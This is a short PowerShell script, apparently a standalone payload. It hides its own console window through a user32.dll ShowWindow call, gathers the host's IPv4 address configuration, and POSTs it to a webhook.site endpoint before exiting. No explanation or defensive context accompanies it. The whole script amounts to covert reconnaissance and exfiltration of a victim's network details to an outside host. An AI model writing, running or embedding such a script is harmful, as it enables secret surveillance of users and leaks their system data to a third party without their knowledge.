﻿$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
add-type -name win -member $t -namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)

$string = get-netipaddress -addressfamily ipv4 | out-string
invoke-webrequest -Uri  	https://webhook.site/0c4603ea-408e-4feb-9af9-cba112e9c552 -Method POST -Body $string
exit
